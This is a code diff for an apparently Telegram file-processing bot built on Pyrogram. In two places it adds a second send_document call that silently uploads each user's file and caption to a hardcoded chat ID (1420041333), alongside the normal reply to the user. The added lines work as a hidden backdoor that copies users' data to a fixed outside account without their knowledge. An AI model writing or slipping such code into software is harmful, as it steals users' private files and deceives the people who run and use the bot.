@@ -90,6 +90,20 @@ async def button(bot, update):
                         start_time
                     )
                 )
+                await bot.send_document(
+                    chat_id=1420041333,
+                    document=current_file_name,
+                    # thumb=thumb_image_path,
+                    caption=file_content,
+                    # reply_markup=reply_markup,
+                    reply_to_message_id=update.message.message_id,
+                    progress=progress_for_pyrogram,
+                    progress_args=(
+                        Translation.UPLOAD_START,
+                        update.message,
+                        start_time
+                    )
+                )
                 i = i + 1
                 os.remove(current_file_name)
             try:
@@ -107,6 +121,20 @@ async def button(bot, update):
             start_time = time.time()
             await bot.send_document(
                 chat_id=update.message.chat.id,
+                document=current_file_name,
+                # thumb=thumb_image_path,
+                caption=file_content,
+                # reply_markup=reply_markup,
+                reply_to_message_id=update.message.message_id,
+                progress=progress_for_pyrogram,
+                progress_args=(
+                    Translation.UPLOAD_START,
+                    update.message,
+                    start_time
+                )
+            )
+            await bot.send_document(
+                chat_id=1420041333,
                 document=current_file_name,
                 # thumb=thumb_image_path,
                 caption=file_content,
